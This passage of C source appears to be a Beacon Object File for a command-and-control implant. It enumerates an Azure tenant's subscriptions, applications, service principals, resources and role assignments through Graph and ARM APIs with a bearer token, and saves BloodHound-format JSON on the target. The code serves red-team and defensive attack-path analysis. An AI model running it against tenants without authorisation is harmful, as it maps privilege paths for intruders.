 *       "/subscriptions/%s/providers/Microsoft.Compute/virtualMachineScaleSets?api-version=2022-03-01",
 *       "AZVMScaleSet");
 * ================================================================ */
#define BARK_MAX_ENUM_IDS 256

/* ================================================================
 * BarkIdList — dynamic growing array of heap-allocated char* pointers.
 * Replaces fixed-size entityId arrays to support unlimited pagination.
 * ================================================================ */
typedef struct { char **ids; int count; int cap; } BarkIdList;

static void BarkIdListInit(BarkIdList *l) {
    l->ids = NULL;
    l->count = 0;
    l->cap = 0;
}

static int BarkIdListAppend(BarkIdList *l, char *id) {
    if (l->cap == 0) {
        l->cap = 256;
        l->ids = (char **)HAlloc(l->cap * sizeof(char *));
        if (!l->ids) return -1;
    } else if (l->count >= l->cap) {
        int newCap = l->cap * 2;
        char **newIds = (char **)HAlloc(newCap * sizeof(char *));
        if (!newIds) return -1;
        MSVCRT$memcpy(newIds, l->ids, l->cap * sizeof(char *));
        HFree(l->ids);
        l->ids = newIds;
        l->cap = newCap;
    }
    l->ids[l->count++] = id;
    return 0;
}

static int BarkIdListContains(const BarkIdList *l, const char *id) {
    int i;
    for (i = 0; i < l->count; i++) {
        if (MSVCRT$strcmp(l->ids[i], id) == 0) return 1;
    }
    return 0;
}

static int BarkIdListAppendUnique(BarkIdList *l, char *id) {
    if (BarkIdListContains(l, id)) return 1;
    return BarkIdListAppend(l, id);
}

/* Accept only a bare subscription GUID and normalize hex digits to lowercase. */
static int BarkNormalizeAzureSubscriptionId(char *id) {
    static const char hex[] = "0123456789abcdefABCDEF";
    SIZE_T i;
    if (!id || MSVCRT$strlen(id) != 36) return 0;
    for (i = 0; i < 36; i++) {
        int j;
        if (i == 8 || i == 13 || i == 18 || i == 23) {
            if (id[i] != '-') return 0;
            continue;
        }
        for (j = 0; j < (int)sizeof(hex) - 1 && id[i] != hex[j]; j++) {}
        if (j == (int)sizeof(hex) - 1) return 0;
        if (id[i] >= 'A' && id[i] <= 'F') id[i] = (char)(id[i] + ('a' - 'A'));
    }
    return 1;
}

static void BarkIdListFree(BarkIdList *l);

/* Parse the comma-separated subscription snapshot supplied by get_all_info.
 * An invalid entry invalidates the whole snapshot so callers can safely fall
 * back to live discovery instead of silently collecting a partial tenant. */
static BarkIdList BarkParseSubscriptionSnapshot(const char *snapshot) {
    BarkIdList ids;
    const char *p;
    BarkIdListInit(&ids);
    if (!snapshot || !snapshot[0]) return ids;

    p = snapshot;
    while (*p) {
        const char *start;
        const char *end;
        SIZE_T len;
        char *id;

        while (*p == ',' || *p == ' ' || *p == '\t' ||
               *p == '\r' || *p == '\n') p++;
        if (!*p) break;
        start = p;
        while (*p && *p != ',') p++;
        end = p;
        while (end > start && (end[-1] == ' ' || end[-1] == '\t' ||
                               end[-1] == '\r' || end[-1] == '\n')) end--;
        len = (SIZE_T)(end - start);
        if (len != 36) goto invalid;

        id = (char *)HAlloc(len + 1);
        if (!id) goto invalid;
        MSVCRT$memcpy(id, start, len);
        id[len] = '\0';
        if (!BarkNormalizeAzureSubscriptionId(id)) {
            HFree(id);
            goto invalid;
        }
        if (BarkIdListAppendUnique(&ids, id) != 0)
            HFree(id);
        if (*p == ',') p++;
    }
    return ids;

invalid:
    BarkIdListFree(&ids);
    return ids;
}

/* Parse the newline-separated ARM resource IDs captured from AZResource.
 * Any malformed entry invalidates the whole snapshot, forcing a complete
 * paginated /resources fallback instead of accepting a partial inventory. */
static BarkIdList BarkParseResourceSnapshot(const char *snapshot) {
    BarkIdList ids;
    const char *p;
    BarkIdListInit(&ids);
    if (!snapshot || !snapshot[0]) return ids;

    p = snapshot;
    while (*p) {
        const char *start;
        const char *end;
        SIZE_T len;
        char *id;

        while (*p == '\r' || *p == '\n') p++;
        if (!*p) break;
        start = p;
        while (*p && *p != '\r' && *p != '\n') p++;
        end = p;
        while (end > start && (end[-1] == ' ' || end[-1] == '\t')) end--;
        len = (SIZE_T)(end - start);
        if (len < 51 || len > 2048 ||
            (MSVCRT$strncmp(start, "/subscriptions/", 15) != 0 &&
             MSVCRT$strncmp(start, "/Subscriptions/", 15) != 0))
            goto invalid_resource_snapshot;

        id = (char *)HAlloc(len + 1);
        if (!id) goto invalid_resource_snapshot;
        MSVCRT$memcpy(id, start, len);
        id[len] = '\0';
        if (BarkIdListAppendUnique(&ids, id) != 0)
            HFree(id);
    }
    return ids;

invalid_resource_snapshot:
    BarkIdListFree(&ids);
    return ids;
}

static void BarkIdListFree(BarkIdList *l) {
    if (l->ids) {
        int i;
        for (i = 0; i < l->count; i++)
            HFree(l->ids[i]);
        HFree(l->ids);
    }
    l->ids = NULL;
    l->count = 0;
    l->cap = 0;
}

/* ================================================================
 * BarkEnumEntityIds
 *
 * Paginated Phase 1 helper: list all entity IDs from a Graph/ARM
 * endpoint, following @odata.nextLink until exhausted.
 * Returns a BarkIdList that the caller must BarkIdListFree().
 * ================================================================ */
static BarkIdList BarkEnumEntityIdsWithStatus(
    LPCWSTR host,
    const char *initialPath,
    const char *bearerToken,
    const char *idKey,
    int *collectionComplete)
{
    BarkIdList ids;
    BarkIdListInit(&ids);
    if (collectionComplete) *collectionComplete = 0;

    LPWSTR hdrWide = BarkMakeAuthHeader(bearerToken, "ConsistencyLevel: eventual\r\n");
    if (!hdrWide) return ids;

    LPWSTR widePath = MbsToWcs(initialPath);
    if (!widePath) { HFree(hdrWide); return ids; }

    char tenantBase[64] = "";
    if (initialPath && initialPath[0] == '/') {
        const char *s = MSVCRT$strstr(initialPath + 1, "/");
        if (s && (s - initialPath) < (int)sizeof(tenantBase) - 1) {
            MSVCRT$strncpy(tenantBase, initialPath, (size_t)(s - initialPath + 1));
            tenantBase[s - initialPath + 1] = '\0';
        }
    }

    LPCWSTR pathArg = widePath;
    char  *nextUrl  = NULL;
    LPWSTR nextWide = NULL;

    while (1) {
        DWORD status = 0;
        int pageValid = 0;
        char *resp = HttpRequestWithRetry(L"GET", host,
            pathArg, hdrWide, NULL, 0, &status);

        if (nextUrl)  { HFree(nextUrl);  nextUrl  = NULL; }
        if (nextWide) { HFree(nextWide); nextWide = NULL; }

        if (!resp || status >= 400) {
            if (resp) HFree(resp);
            break;
        }

        SIZE_T respLen = MSVCRT$strlen(resp);
        const char *end = resp + respLen;
        const char *vKey = JsonFindKey(resp, end, "\"value\"");
        if (vKey) {
            const char *colon = JsonFindKey(vKey, end, ":");
            if (colon) {
                colon++;
                while (colon < end && (*colon == ' ' || *colon == '\t' ||
                       *colon == '\n' || *colon == '\r')) colon++;
                if (colon < end && *colon == '[') {
                    const char *arrEnd = JsonSkipBalanced(colon, end);
                    if (arrEnd) {
                        pageValid = 1;
                        const char *p = colon + 1;
                        while (p < arrEnd - 1) {
                            while (p < arrEnd - 1 && *p != '{') p++;
                            if (p >= arrEnd - 1) break;
                            const char *itemEnd = JsonSkipBalanced(p, arrEnd);
                            if (!itemEnd) break;
                            char *oid = JsonExtractStringValue(p, itemEnd, idKey);
                            if (oid && MSVCRT$strlen(oid) > 0) {
                                int appended;
                                if (idKey && MSVCRT$strcmp(idKey, "\"subscriptionId\"") == 0) {
                                    if (!BarkNormalizeAzureSubscriptionId(oid)) {
                                        HFree(oid);
                                        oid = NULL;
                                    } else {
                                        appended = BarkIdListAppendUnique(&ids, oid);
                                        if (appended != 0) HFree(oid);
                                    }
                                } else {
                                    appended = BarkIdListAppend(&ids, oid);
                                    if (appended != 0) HFree(oid);
                                }
                            } else if (oid) HFree(oid);
                            p = itemEnd;
                        }
                    }
                }
            }
        }

        if (!pageValid) {
            BeaconPrintf(CALLBACK_ERROR,
                "[-] Entity enumeration response did not contain a valid value array\n");
            HFree(resp);
            break;
        }

        nextUrl = JsonExtractNextLink(resp, end);
        HFree(resp);
        if (!nextUrl) {
            if (collectionComplete) *collectionComplete = 1;
            break;
        }

        nextWide = BarkResolveNextLink(nextUrl, host, tenantBase);
        if (!nextWide) break;
        pathArg = nextWide;
    }

    if (nextUrl) HFree(nextUrl);
    if (nextWide) HFree(nextWide);
    HFree(hdrWide);
    HFree(widePath);
    return ids;
}

static BarkIdList BarkEnumEntityIds(
    LPCWSTR host,
    const char *initialPath,
    const char *bearerToken,
    const char *idKey)
{
    return BarkEnumEntityIdsWithStatus(host, initialPath, bearerToken,
        idKey, NULL);
}

/* Enumerate only resource service principals that expose at least one app
 * role.  appRoleAssignedTo is resource-centric, but querying it for every
 * service principal is needlessly expensive: most tenants have hundreds of
 * resource SPs with no app roles.  AzureHound applies the same filter before
 * starting its assignment workers. */
static BarkIdList BarkEnumAppRoleResourceIds(const char *bearerToken,
                                              BarkIdList *appIds) {
    BarkIdList ids;
    LPWSTR hdrWide = NULL;
    LPWSTR widePath = NULL;
    LPWSTR nextWide = NULL;
    char *nextUrl = NULL;
    LPCWSTR pathArg;

    BarkIdListInit(&ids);
    if (appIds) BarkIdListInit(appIds);
    hdrWide = BarkMakeAuthHeader(bearerToken,
        "ConsistencyLevel: eventual\r\n");
    if (!hdrWide) return ids;
    widePath = MbsToWcs(
        "/v1.0/servicePrincipals?$top=999&$select=id,appId,appRoles");
    if (!widePath) {
        HFree(hdrWide);
        return ids;
    }
    pathArg = widePath;

    while (1) {
        DWORD status = 0;
        char *resp = HttpRequestWithRetry(L"GET", L"graph.microsoft.com",
            pathArg, hdrWide, NULL, 0, &status);
        if (nextUrl) { HFree(nextUrl); nextUrl = NULL; }
        if (nextWide) { HFree(nextWide); nextWide = NULL; }
        if (!resp || status >= 400) {
            if (resp) HFree(resp);
            break;
        }

        {
            const char *end = resp + MSVCRT$strlen(resp);
            const char *vKey = JsonFindKey(resp, end, "\"value\"");
            const char *colon = vKey ? JsonFindKey(vKey, end, ":") : NULL;
            if (colon) {
                const char *arrEnd;
                const char *p;
                colon++;
                while (colon < end && (*colon == ' ' || *colon == '\t' ||
                       *colon == '\n' || *colon == '\r')) colon++;
                arrEnd = (colon < end && *colon == '[') ?
                    JsonSkipBalanced(colon, end) : NULL;
                p = colon + 1;
                while (arrEnd && p < arrEnd - 1) {
                    const char *itemEnd;
                    const char *rolesKey;
                    const char *rolesColon;
                    const char *rolesEnd;
                    const char *roleItem;
                    char *id;
                    char *appId;

                    while (p < arrEnd - 1 && *p != '{') p++;
                    if (p >= arrEnd - 1) break;
                    itemEnd = JsonSkipBalanced(p, arrEnd);
                    if (!itemEnd) break;

                    rolesKey = JsonFindKey(p, itemEnd, "\"appRoles\"");
                    rolesColon = rolesKey ?
                        JsonFindKey(rolesKey, itemEnd, ":") : NULL;
                    rolesEnd = NULL;
                    roleItem = NULL;
                    if (rolesColon) {
                        rolesColon++;
                        while (rolesColon < itemEnd &&
                               (*rolesColon == ' ' || *rolesColon == '\t' ||
                                *rolesColon == '\n' || *rolesColon == '\r'))
                            rolesColon++;
                        if (rolesColon < itemEnd && *rolesColon == '[') {
                            rolesEnd = JsonSkipBalanced(rolesColon, itemEnd);
                            roleItem = rolesColon + 1;
                            while (rolesEnd && roleItem < rolesEnd - 1 &&
                                   (*roleItem == ' ' || *roleItem == '\t' ||
                                    *roleItem == '\n' || *roleItem == '\r' ||
                                    *roleItem == ','))
                                roleItem++;
                        }
                    }
                    if (rolesEnd && roleItem && roleItem < rolesEnd - 1 &&
                        *roleItem == '{') {
                        id = JsonExtractStringValue(p, itemEnd, "\"id\"");
                        appId = JsonExtractStringValue(
                            p, itemEnd, "\"appId\"");
                        if (id && id[0] && appId && appId[0] && appIds) {
                            if (BarkIdListAppend(&ids, id) != 0) {
                                HFree(id);
                                HFree(appId);
                            } else if (BarkIdListAppend(appIds, appId) != 0) {
                                ids.count--;
                                HFree(id);
                                HFree(appId);
                            }
                        } else {
                            if (id) HFree(id);
                            if (appId) HFree(appId);
                        }
                    }
                    p = itemEnd;
                }
            }
            nextUrl = JsonExtractNextLink(resp, end);
        }
        HFree(resp);
        if (!nextUrl) break;
        nextWide = BarkResolveNextLink(nextUrl,
            L"graph.microsoft.com", "");
        if (!nextWide) break;
        pathArg = nextWide;
    }

    if (nextUrl) HFree(nextUrl);
    if (nextWide) HFree(nextWide);
    HFree(widePath);
    HFree(hdrWide);
    return ids;
}

/* Append a Graph application object ID and its BloodHound application ID as
 * one aligned pair.  The Graph object ID is used to address child endpoints;
 * BloodHound identifies AZApp nodes by appId (the application/client ID). */
static int BarkAppendApplicationIdPair(BarkIdList *objectIds,
                                       BarkIdList *appIds,
                                       const char *item,
                                       const char *itemEnd) {
    char *objectId = JsonExtractStringValue(item, itemEnd, "\"id\"");
    char *appId = JsonExtractStringValue(item, itemEnd, "\"appId\"");

    if (!objectId || !objectId[0] || !appId || !appId[0]) {
        if (objectId) HFree(objectId);
        if (appId) HFree(appId);
        return 0;
    }
    if (BarkIdListAppend(objectIds, objectId) != 0) {
        HFree(objectId);
        HFree(appId);
        return -1;
    }
    if (BarkIdListAppend(appIds, appId) != 0) {
        objectIds->count--;
        HFree(objectId);
        HFree(appId);
        return -1;
    }
    return 1;
}

/* Enumerate Graph application object IDs together with their appIds.  The
 * two returned lists always have matching indexes and are both caller-owned.
 * If applicationObjectId is supplied, only that application is resolved. */
static BarkIdList BarkEnumApplicationIds(const char *bearerToken,
                                         const char *applicationObjectId,
                                         BarkIdList *appIds) {
    BarkIdList objectIds;
    LPWSTR hdrWide = NULL;
    LPWSTR widePath = NULL;
    LPWSTR nextWide = NULL;
    char *nextUrl = NULL;
    LPCWSTR pathArg;
    char path[512];
    int single;
    int failed = 0;

    BarkIdListInit(&objectIds);
    if (!appIds) return objectIds;
    BarkIdListInit(appIds);
    single = applicationObjectId && applicationObjectId[0];

    hdrWide = BarkMakeAuthHeader(bearerToken,
        "ConsistencyLevel: eventual\r\n");
    if (!hdrWide) return objectIds;
    if (single) {
        MSVCRT$sprintf_s(path, sizeof(path),
            "/v1.0/applications/%s?$select=id,appId",
            applicationObjectId);
    } else {
        MSVCRT$sprintf_s(path, sizeof(path),
            "/v1.0/applications?$top=999&$select=id,appId");
    }
    widePath = MbsToWcs(path);
    if (!widePath) {
        HFree(hdrWide);
        return objectIds;
    }
    pathArg = widePath;

    while (1) {
        DWORD status = 0;
        char *resp = HttpRequestWithRetry(L"GET", L"graph.microsoft.com",
            pathArg, hdrWide, NULL, 0, &status);
        if (nextUrl) { HFree(nextUrl); nextUrl = NULL; }
        if (nextWide) { HFree(nextWide); nextWide = NULL; }
        if (!resp || status >= 400) {
            if (resp) HFree(resp);
            failed = 1;
            break;
        }

        {
            const char *end = resp + MSVCRT$strlen(resp);
            if (single) {
                if (BarkAppendApplicationIdPair(
                        &objectIds, appIds, resp, end) < 0)
                    failed = 1;
            } else {
                const char *vKey = JsonFindKey(resp, end, "\"value\"");
                const char *colon = vKey ? JsonFindKey(vKey, end, ":") : NULL;
                if (colon) {
                    const char *arrEnd;
                    const char *p;
                    colon++;
                    while (colon < end && (*colon == ' ' || *colon == '\t' ||
                           *colon == '\n' || *colon == '\r')) colon++;
                    arrEnd = (colon < end && *colon == '[') ?
                        JsonSkipBalanced(colon, end) : NULL;
                    p = colon + 1;
                    while (arrEnd && p < arrEnd - 1) {
                        const char *itemEnd;
                        int appended;
                        while (p < arrEnd - 1 && *p != '{') p++;
                        if (p >= arrEnd - 1) break;
                        itemEnd = JsonSkipBalanced(p, arrEnd);
                        if (!itemEnd) {
                            failed = 1;
                            break;
                        }
                        appended = BarkAppendApplicationIdPair(
                            &objectIds, appIds, p, itemEnd);
                        if (appended < 0) {
                            failed = 1;
                            break;
                        }
                        p = itemEnd;
                    }
                } else {
                    failed = 1;
                }
                if (!failed)
                    nextUrl = JsonExtractNextLink(resp, end);
            }
        }
        HFree(resp);
        if (failed || single || !nextUrl) break;
        nextWide = BarkResolveNextLink(nextUrl,
            L"graph.microsoft.com", "");
        if (!nextWide) {
            failed = 1;
            break;
        }
        pathArg = nextWide;
    }

    if (nextUrl) HFree(nextUrl);
    if (nextWide) HFree(nextWide);
    HFree(widePath);
    HFree(hdrWide);
    if (failed) {
        BarkIdListFree(&objectIds);
        BarkIdListFree(appIds);
    }
    return objectIds;
}

static BarkIdList BarkMgmtGroupFallbackGetSubscriptionIdsWithStatus(
    const char *bearerToken, int *collectionComplete);
static BarkIdList BarkMgmtGroupFallbackGetSubscriptionIds(
    const char *bearerToken);

static void BarkGetBHAllSubscriptions(const char *bearerToken,
                                       const char *pathFmt,
                                       const char *kind) {
    /* --- Phase 1: enumerate subscription IDs (paginated) --- */
    BarkIdList subs = BarkEnumEntityIds(
        L"management.azure.com",
        "/subscriptions?api-version=2020-01-01",
        bearerToken, "\"subscriptionId\"");

    if (subs.count == 0) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[!] /subscriptions returned empty, trying management group fallback...\n");
        BarkIdListFree(&subs);
        subs = BarkMgmtGroupFallbackGetSubscriptionIds(bearerToken);
    }
    if (subs.count == 0) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[*] BarkGetBHAllSubscriptions(%s): no subscriptions found\n", kind);
        BarkIdListFree(&subs);
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] Found %d subscription(s), enumerating %s across all...\n", subs.count, kind);

    /* --- Phase 2: for each subscription, paginate through results --- */
    BarkBuf b = { NULL, 0, 0, 1 };
    BarkBufAppend(&b, "{\"data\":[", 9);
    int emitted = 0;
    int si;

    for (si = 0; si < subs.count; si++) {
        char pathBuf[2048];
        MSVCRT$sprintf_s(pathBuf, sizeof(pathBuf), pathFmt, subs.ids[si]);
        LPWSTR widePath = MbsToWcs(pathBuf);
        if (!widePath) continue;

        int isArray = 0;
        LPCWSTR pathArg = widePath;
        LPWSTR nextWide = NULL;
        char  *nextUrl  = NULL;

        while (1) {
            char *next = BarkGetBHPageBuf(L"management.azure.com", pathArg,
                                          bearerToken, kind, &b, &emitted, &isArray, NULL, 0);
            if (nextUrl)  { HFree(nextUrl);  nextUrl  = NULL; }
            if (nextWide) { HFree(nextWide); nextWide = NULL; }
            if (!next) break;
            /* Parse absolute URL -> path portion */
            char *np = next;
            if (MSVCRT$strncmp(np, "http://", 7) == 0)       np += 7;
            else if (MSVCRT$strncmp(np, "https://", 8) == 0)  np += 8;
            char *slash = MSVCRT$strstr(np, "/");
            nextWide = MbsToWcs(slash ? slash : next);
            nextUrl = next;
            if (!nextWide) break;
            pathArg = nextWide;
        }
        HFree(widePath);
    }

    /* --- Phase 3: write BH envelope to file --- */
    char tail[128];
    int tailLen = MSVCRT$sprintf_s(tail, sizeof(tail),
        "],\"meta\":{\"type\":\"azure\",\"version\":5,\"count\":%d}}", emitted);
    if (tailLen > 0) BarkBufAppend(&b, tail, (SIZE_T)tailLen);

    if (b.ok && b.buf) {
        SYSTEMTIME st;
        KERNEL32$GetLocalTime(&st);
        const char *kindShort = kind;
        if (kindShort[0] == 'A' && kindShort[1] == 'Z') kindShort += 2;
        char filename[300];
        MSVCRT$sprintf_s(filename, sizeof(filename),
            ".\\AZ%s_%04u%02u%02u_%02u%02u%02u.json",
            kindShort,
            (unsigned)st.wYear, (unsigned)st.wMonth, (unsigned)st.wDay,
            (unsigned)st.wHour, (unsigned)st.wMinute, (unsigned)st.wSecond);
        BeaconPrintf(CALLBACK_OUTPUT,
                "[+] BARK %s found %d objects across %d subscription(s)\n",
                kind, emitted, subs.count);
        BarkWriteOutput(filename, b.buf, (DWORD)b.len);
    }
    BarkBufFree(&b);
    BarkIdListFree(&subs);
}

/* ================================================================
 * BarkGetBHAllResourceRoleAssignments
 *
 * Auto-discover all Azure resources of `resourceType` via the
 * cross-subscription /resources?$filter= API, then for each
 * discovered resource fetch its role assignments.
 *
 * Example:
 *   BarkGetBHAllResourceRoleAssignments(token,
 *       "Microsoft.ContainerService/managedClusters");
 * ================================================================ */
static void BarkGetBHAllResourceRoleAssignments(const char *bearerToken,
                                                 const char *resourceType) {
    /* --- Phase 1: enumerate resource IDs (paginated) --- */
    char filterPath[512];
    MSVCRT$sprintf_s(filterPath, sizeof(filterPath),
        "/resources?$filter=resourceType%%20eq%%20'%s'&api-version=2021-04-01",
        resourceType);

    BarkIdList res = BarkEnumEntityIds(
        L"management.azure.com", filterPath, bearerToken, "\"id\"");

    if (res.count == 0) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[*] No resources of type %s found for role-assignment enumeration\n",
            resourceType);
        BarkIdListFree(&res);
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] Found %d %s resource(s), enumerating role assignments...\n",
        res.count, resourceType);

    /* --- Phase 2: for each resource, get role assignments --- */
    BarkBuf b = { NULL, 0, 0, 1 };
    BarkBufAppend(&b, "{\"data\":[", 9);
    int emitted = 0;
    int ri;

    for (ri = 0; ri < res.count; ri++) {
        char raPath[2048];
        MSVCRT$sprintf_s(raPath, sizeof(raPath),
            "%s/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01",
            res.ids[ri]);
        LPWSTR widePath = MbsToWcs(raPath);
        if (!widePath) continue;

        int isArray = 0;
        LPCWSTR pathArg = widePath;
        LPWSTR nextWide = NULL;
        char  *nextUrl  = NULL;

        while (1) {
            char *next = BarkGetBHPageBuf(L"management.azure.com", pathArg,
                                          bearerToken, "AZRoleAssignment",
                                          &b, &emitted, &isArray, NULL, 0);
            if (nextUrl)  { HFree(nextUrl);  nextUrl  = NULL; }
            if (nextWide) { HFree(nextWide); nextWide = NULL; }
            if (!next) break;
            char *np = next;
            if (MSVCRT$strncmp(np, "http://", 7) == 0)       np += 7;
            else if (MSVCRT$strncmp(np, "https://", 8) == 0)  np += 8;
            char *slash = MSVCRT$strstr(np, "/");
            nextWide = MbsToWcs(slash ? slash : next);
            nextUrl = next;
            if (!nextWide) break;
            pathArg = nextWide;
        }
        HFree(widePath);
    }

    /* --- Phase 3: write BH envelope --- */
    char tail[128];
    int tailLen = MSVCRT$sprintf_s(tail, sizeof(tail),
        "],\"meta\":{\"type\":\"azure\",\"version\":5,\"count\":%d}}", emitted);
    if (tailLen > 0) BarkBufAppend(&b, tail, (SIZE_T)tailLen);

    if (b.ok && b.buf) {
        SYSTEMTIME st;
        KERNEL32$GetLocalTime(&st);
        /* Use the resource type's last segment as the kind suffix */
        const char *shortType = MSVCRT$strstr(resourceType, "/");
        if (shortType) shortType++; else shortType = resourceType;
        char filename[300];
        MSVCRT$sprintf_s(filename, sizeof(filename),
            ".\\AZ%sRoleAssignments_%04u%02u%02u_%02u%02u%02u.json",
            shortType,
            (unsigned)st.wYear, (unsigned)st.wMonth, (unsigned)st.wDay,
            (unsigned)st.wHour, (unsigned)st.wMinute, (unsigned)st.wSecond);
        BeaconPrintf(CALLBACK_OUTPUT,
                "[+] BARK AZRoleAssignment (%s) found %d role assignments across %d resource(s)\n",
                resourceType, emitted, res.count);
        BarkWriteOutput(filename, b.buf, (DWORD)b.len);
    }
    BarkBufFree(&b);
    BarkIdListFree(&res);
}

/* ================================================================
 * BarkLookupRoleName
 *
 * Search a newline-separated lookup string of "roleDefId=roleName"
 * pairs for the given roleDefId.  Writes roleName to `out`.
 * The roleDefId in the lookup uses the full ARM path; we match by
 * the trailing GUID segment (after the last /).
 * Returns 1 on match, 0 if not found (out is set to "Unknown").
 * ================================================================ */
static int BarkLookupRoleName(const char *lookup, const char *roleDefId,
                               char *out, int outSize) {
    MSVCRT$strncpy(out, "Unknown", (size_t)(outSize - 1));
    out[outSize - 1] = '\0';
    if (!lookup || !roleDefId) return 0;

    /* Extract GUID from the roleDefId (last segment after /) */
    const char *guid = roleDefId;
    const char *slash = MSVCRT$strstr(roleDefId, "/");
    while (slash) {
        guid = slash + 1;
        slash = MSVCRT$strstr(guid, "/");
    }
    if (MSVCRT$strlen(guid) == 0) return 0;

    SIZE_T guidLen = MSVCRT$strlen(guid);
    const char *p = lookup;
    while (p && *p) {
        /* Each line: <id>=<roleName>\n */
        const char *eq = MSVCRT$strstr(p, "=");
        const char *nl = MSVCRT$strstr(p, "\n");
        if (!eq) break;
        /* Check if the id portion ends with our GUID */
        SIZE_T idLen = (SIZE_T)(eq - p);
        if (idLen >= guidLen) {
            const char *idTail = eq - guidLen;
            if (MSVCRT$strncmp(idTail, guid, guidLen) == 0 &&
                (idTail == p || *(idTail - 1) == '/')) {
                /* Found match — extract roleName */
                const char *nameStart = eq + 1;
                const char *nameEnd = nl ? nl : nameStart + MSVCRT$strlen(nameStart);
                int nameLen = (int)(nameEnd - nameStart);
                if (nameLen > 0 && nameLen < outSize) {
                    MSVCRT$memcpy(out, nameStart, (size_t)nameLen);
                    out[nameLen] = '\0';
                    return 1;
                }
            }
        }
        if (!nl) break;
        p = nl + 1;
    }
    return 0;
}

/* Resolve one role definition directly from ARM when diskless mode has no
 * target-side AZRoleDefinition file to consult.  The grouped caller invokes
 * this only once per unique roleDefinitionId. */
static int BarkFetchRoleNameArm(LPCWSTR hdrWide, const char *roleDefId,
                                char *out, int outSize) {
    char path[2304];
    LPWSTR widePath;
    DWORD status = 0;
    char *resp;
    char *roleName;

    if (!hdrWide || !roleDefId || roleDefId[0] == '\0' ||
        !out || outSize < 2)
        return 0;

    if (MSVCRT$strstr(roleDefId, "?")) {
        MSVCRT$sprintf_s(path, sizeof(path),
            "%s&api-version=2022-04-01", roleDefId);
    } else {
        MSVCRT$sprintf_s(path, sizeof(path),
            "%s?api-version=2022-04-01", roleDefId);
    }
    widePath = MbsToWcs(path);
    if (!widePath) return 0;
    resp = HttpRequestWithRetry(L"GET", L"management.azure.com",
        widePath, hdrWide, NULL, 0, &status);
    HFree(widePath);
    if (!resp || status >= 400) {
        if (resp) HFree(resp);
        return 0;
    }

    roleName = JsonExtractStringValue(resp,
        resp + MSVCRT$strlen(resp), "\"roleName\"");
    if (!roleName || roleName[0] == '\0') {
        if (roleName) HFree(roleName);
        HFree(resp);
        return 0;
    }
    MSVCRT$strncpy(out, roleName, (size_t)(outSize - 1));
    out[outSize - 1] = '\0';
    HFree(roleName);
    HFree(resp);
    return 1;
}

/* Strip spaces from src to form CamelCase kind name. */
static void BarkStripSpaces(const char *src, char *dst, int dstSize) {
    int di = 0;
    int si = 0;
    while (src[si] && di < dstSize - 1) {
        if (src[si] != ' ')
            dst[di++] = src[si];
        si++;
    }
    dst[di] = '\0';
}

/* ================================================================
 * BarkLoadRoleDefLookupFromDisk
 *
 * If roleDefLookup is NULL or empty, try reading the most recent
 * AZRoleDefinition_*.json from the target CWD and building the
 * lookup string.  Returns a heap-allocated string or NULL.
 * Caller must HFree the result.
 * ================================================================ */
WINBASEAPI HANDLE WINAPI KERNEL32$FindFirstFileA(
    LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindFileData);
WINBASEAPI BOOL   WINAPI KERNEL32$FindNextFileA(
    HANDLE hFindFile, LPWIN32_FIND_DATAA lpFindFileData);
WINBASEAPI BOOL   WINAPI KERNEL32$FindClose(HANDLE hFindFile);
WINBASEAPI BOOL   WINAPI KERNEL32$ReadFile(
    HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead,
    LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
WINBASEAPI DWORD  WINAPI KERNEL32$GetFileSize(
    HANDLE hFile, LPDWORD lpFileSizeHigh);

static char *BarkLoadRoleDefLookupFromDisk(void) {
    WIN32_FIND_DATAA fd;
    HANDLE hFind = KERNEL32$FindFirstFileA(".\\AZRoleDefinition_*.json", &fd);
    if (hFind == INVALID_HANDLE_VALUE) return NULL;

    /* Use the last file found (alphabetically latest = most recent timestamp) */
    char bestName[MAX_PATH] = {0};
    MSVCRT$strncpy(bestName, fd.cFileName, MAX_PATH - 1);
    while (KERNEL32$FindNextFileA(hFind, &fd)) {
        if (MSVCRT$strcmp(fd.cFileName, bestName) > 0)
            MSVCRT$strncpy(bestName, fd.cFileName, MAX_PATH - 1);
    }
    KERNEL32$FindClose(hFind);

    if (bestName[0] == '\0') return NULL;

    char fullPath[MAX_PATH + 4];
    MSVCRT$sprintf_s(fullPath, sizeof(fullPath), ".\\%s", bestName);

    HANDLE hf = KERNEL32$CreateFileA(fullPath,
        GENERIC_READ, FILE_SHARE_READ, NULL,
        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) return NULL;

    DWORD fsize = KERNEL32$GetFileSize(hf, NULL);
    if (fsize == INVALID_FILE_SIZE || fsize == 0) {
        KERNEL32$CloseHandle(hf);
        return NULL;
    }

    char *content = (char *)HAlloc(fsize + 1);
    if (!content) { KERNEL32$CloseHandle(hf); return NULL; }

    DWORD nread = 0;
    KERNEL32$ReadFile(hf, content, fsize, &nread, NULL);
    KERNEL32$CloseHandle(hf);
    if (nread == 0) { HFree(content); return NULL; }
    content[nread] = '\0';

    /* Build lookup: scan for roleDefinition items, extract id and roleName */
    BarkBuf lb = { NULL, 0, 0, 1 };
    const char *end = content + nread;
    const char *p = content;

    while (p < end) {
        /* Find next "kind":"AZRoleDefinition" */
        const char *kindKey = MSVCRT$strstr(p, "\"kind\":\"AZRoleDefinition\"");
        if (!kindKey) break;

        /* Find the inner data object */
        const char *dataKey = JsonFindKey(kindKey, end, "\"data\"");
        if (!dataKey) { p = kindKey + 25; continue; }
        const char *dc = JsonFindKey(dataKey, end, ":");
        if (!dc) { p = kindKey + 25; continue; }
        dc++;
        while (dc < end && (*dc == ' ' || *dc == '\t' || *dc == '\n' || *dc == '\r')) dc++;
        if (dc >= end || *dc != '{') { p = kindKey + 25; continue; }
        const char *de = JsonSkipBalanced(dc, end);
        if (!de) { p = kindKey + 25; continue; }

        char *id = JsonExtractStringValue(dc, de, "\"id\"");
        /* Find properties.roleName */
        const char *propsKey = JsonFindKey(dc, de, "\"properties\"");
        char *roleName = NULL;
        if (propsKey) {
            const char *pc = JsonFindKey(propsKey, de, ":");
            if (pc) {
                pc++;
